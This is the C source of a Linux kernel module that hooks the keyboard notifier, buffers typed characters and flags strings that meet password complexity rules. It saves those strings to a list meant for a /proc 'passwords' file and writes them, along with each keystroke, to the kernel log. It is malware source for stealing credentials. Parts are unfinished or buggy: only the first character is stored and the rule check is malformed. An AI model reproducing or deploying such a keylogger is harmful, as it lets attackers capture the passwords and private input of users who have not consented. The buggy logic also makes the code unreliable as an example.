/* What we need to do:
 * 	1. The recorded keycode isn't 1:1 on the letter typed. Only record
 * 	   on the typed letter.
 * 	2. Record the last 15 characters ACTUALLY typed to the screen and
 * 	   check if it meets password rules:
 * 	   (3 of the 4: lowercase letters, uppercase letters, symbols, numbers)
 * 	3. Save a password that fits #2 in a proc file called "passwords". Save
 * 	   The last 100 potential paswords. We can use a linked list type data
 * 	   structure or just allocate a ton of space in a list of char*, probably
 * 	   go with the linked list. A linked list would have bad lookup time but
 * 	   it would be in 'order' anyways with re writing the passwords after 100
 *
 * 	-  The 2d array called 'keymap' takes [keycode][shift_boolean] to retrieve
 * 	   a letter.
 *
 * */

#include "helper.h"

#define PROC_FILE_NAME "passwords"

struct notifier_block nb;
int password_count;
bool overwrite = false;
struct password* HEAD = NULL;

// We want a reference to the password* head
// TODO create a remove / overwrite with kfree
void push(struct password** head, char* password_value){ // Probably don't need to set this as a parameter, but whatever, I like it.
        // 'current' is a macro :/
	struct password* curr;
	struct password* new_node;
	
	password_count++; // TODO keep an eye on the location of this.
	
	if(!overwrite){
		// Use kfree on this bad boy
		new_node = (struct password*)kmalloc(sizeof(struct password), GFP_KERNEL);
		new_node->pw[0] = password_value[0]; // TODO fix this assigment
		new_node->overwrite_num = 1;
	        new_node->next = NULL;
        
		if(*head == NULL){
        	        *head = new_node;
        	        return;
        	}

        	curr = *head;
        	while(curr->next != NULL){
        	        curr = curr->next;
        	}
        	curr->next = new_node;

		if(password_count == 100){
			new_node->next = *head;
			overwrite = true;
		}
	
	}else{
		// Iterate until we find the next node for overwriting
		curr = *head;
		if(password_count % 100 == 1){ // Should be at head again.
			curr->pw[0] = password_value[0];
			curr->overwrite_num++;
			return;
		}
		while(curr->overwrite_num == curr->next->overwrite_num){
			curr = curr->next;
		} // Brings curr to the last written node before this push call

		curr->next->pw[0] = password_value[0];
		curr->next->overwrite_num++;
	}

}

void ll_destructor(struct password** head){
	struct password* next;
	struct password* curr;
	int i;

	if(*head == NULL){
		return;
	}

	curr = *head;
	for(i=0; i<100; i++){
                next = curr->next;
                kfree(curr);
                if(next != NULL){
                        curr = next;
                }
        }
	overwrite = false;
}

void check_pw(char* pw, int len){
	// uppercase, lowercase, number, symbol
	char rules[4] = {0, 0, 0, 0};
	int i;
	char *c;
	int reject = 0;
	for(c=pw; *c ; c++){
		if(*c >= 'A' && *c <= 'Z'){
			rules[0] = 1;
		} 
		else if(*c >= 'a' && *c <= 'z'){
			rules[1] = 1;
		}
		else if(*c >= '0' && *c <= '9'){
			rules[2] = 1;
		}
		else if(isprint(*c)) { // Everything else can be a symbol
			rules[3] = 1;
		}else {
			reject = 1;
		}
	}
	if(rules[0] += rules[1] += rules[2] += rules[3] > 2 && !reject){ // At least 3 are correct
		push(&HEAD, pw);
		printk("Password: %s\n", pw);
	}
}


ssize_t read_password(struct file *filp,char *buf,size_t count,loff_t *offp ) {
	return 0;
}

struct proc_ops proc_fops = {
	proc_read: read_password,
};

char pw_buffer[16];

int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data){
	int len;
	struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;
	//printk("Key:  %d  Lights:  %d  Shiftmax:  %x\n", kp->value, kp->ledstate, kp->shift);

	if(kp->value > 57 || kp->value == 54 || kp->value == 42 || kp->value == 14) return 0; // The shifts and back space

	len = strlen(pw_buffer);
	if(len == 15 || kp->value == 57){ // reset it on a space as well
		check_pw(pw_buffer, len);
		pw_buffer[0] = '\0';
		if(kp->value == 57) return 0; // return if it is a space
	}
	
	pw_buffer[len] = *keymap[kp->value][kp->shift];
	
	printk("Letter: %s\n", keymap[kp->value][kp->shift]);
	printk("Number of passwords: %d\n", password_count);

	return 0;
}

int init (void) {
	password_count = 0;
	
	nb.notifier_call = kb_notifier_fn;
	register_keyboard_notifier(&nb);
	// proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);
	return 0;
}

void cleanup(void) {
	unregister_keyboard_notifier(&nb);
	ll_destructor(&HEAD);
	// remove_proc_entry(PROC_FILE_NAME,NULL);
}

MODULE_LICENSE("GPL"); 
module_init(init);
module_exit(cleanup);

